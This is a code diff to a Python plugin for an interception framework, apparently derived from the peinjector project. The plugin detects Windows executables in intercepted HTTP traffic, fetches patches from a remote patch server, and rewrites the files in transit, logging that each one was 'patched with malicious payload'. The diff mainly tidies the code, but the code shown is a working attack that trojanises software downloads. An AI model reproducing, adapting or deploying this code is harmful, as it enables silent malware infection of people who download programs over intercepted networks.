@@ -4,20 +4,20 @@ https://github.com/JonDoNym/peinjector/blob/master/pe-injector-interceptor/peinj
 """
 
 import os
+from socket import socket
 from mitmplugin import MITMPlugin
 from ..MITMPluginsAux.libPePatch import PePatch
 
-exe_mimetypes = [   
-                    'application/octet-stream', 'application/x-msdownload', 
+exe_mimetypes = [
+                    'application/octet-stream', 'application/x-msdownload',
                     'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
                     'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program'
                 ]
 
 class PeInjector(MITMPlugin):
 
-
-    def __init__(self):
-        super(PeInjector, self).__init__("peinjector")
+    def __init__(self, config):
+        super(PeInjector, self).__init__(config, "peinjector")
         self.pe_server_port = int(self.config["pe_server_port"])
         # Minimum PE Size
         self.pe_minimum_size = int(self.config["pe_minimum_size"])
@@ -47,11 +47,10 @@ class PeInjector(MITMPlugin):
                 flow.response.stream = build_pe_modifier(flow, (self.config["pe_server_address"], self.config["pe_server_port"]), self.pe_modifier_config)
             else:
                 flow.response.stream = bypass_stream
-        except Exception as e:
+        except Exception:
             pass
 
-
- # Bypass stream data without modifying
+# Bypass stream data without modifying
 def bypass_stream(chunks):
     for content in chunks:
         yield content
@@ -59,19 +58,18 @@ def bypass_stream(chunks):
 # Build Payload Modifier
 def build_pe_modifier(flow, patch_address, config):
     def modify(chunks):
-        
         # Maximum PE Header size to expect
         # Maximum Patch size to expect
         # Connection Timeout
         # Access Token
         max_header, max_patch, connection_timeout, access_token = config
-        
+
         header = True
         patcher = None
         position = 0
         for content in chunks:
             # Only do this for 1. chunk, and quick PE check
-            if header and (content[:2] == 'MZ'): 
+            if header and (content[:2] == 'MZ'):
                 print("[+] Intercept PE, send header to server ({} bytes)".format(len(content)))
                 # If something goes wrong while network transmission
                 try:
@@ -90,19 +88,19 @@ def build_pe_modifier(flow, patch_address, config):
                         else:
                             print("[-] Error parsing patch")
                             patcher = None
-                except Exception as e:
+                except Exception:
                     patcher = None
 
             # Check only 1. chunk for header
             header = False
-            
+
             # Apply Patch
             if patcher is not None:
                 content = patcher.apply_patch(content, position)
                 position += len(content)
 
             yield content
-            
+
         if patcher is not None:
             print "[peinjector] Patched '{}' with malicious payload".format(flow.request.url.split("/")[-1])
 
